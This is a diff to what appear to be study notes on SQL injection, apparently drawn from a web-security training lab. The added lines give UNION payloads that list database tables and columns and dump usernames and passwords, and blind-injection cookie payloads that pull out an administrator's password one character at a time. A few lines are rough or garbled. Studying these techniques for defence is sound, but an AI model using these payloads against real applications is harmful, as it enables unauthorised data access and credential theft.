@@ -92,19 +92,46 @@ Microsoft, MySQL	SELECT @@version
 Oracle	SELECT * FROM v$version
 PostgreSQL	SELECT version()
 For example, you could use a UNION attack with the following input:
-' UNION SELECT @@version--
+' UNION SELECT @@version--  && ' UNION SELECT @@version--+
 This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:
 Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
 Mar 18 2018 09:11:49
 Copyright (c) Microsoft Corporation
 Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
 
+*Listing the contents of the database
+Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
+For example, you can query information_schema.tables to list the tables in the database:
+SELECT * FROM information_schema.tables
+'+UNION+SELECT+'abc','def'--
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
 
-
-
-' UNION SELECT banner FROM v$version
-
-
+*Blind SQL injection
+Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user:
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+To understand how this exploit works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
+…xyz' AND '1'='1
+…xyz' AND '1'='2
+this for user name.
+TrackingId=F1047r7QgL3blDNA' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+to know leng of the password use this 
+TrackingId=F1047r7QgL3blDNA' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
+To do this, start with the following input:
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.
+Next, we send the following input:
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than t.
+Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is s:
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+Note
+The SUBSTRING function is called SUBSTR on some types of database. For more details, see the SQL injection cheat sheet.
 
 
 
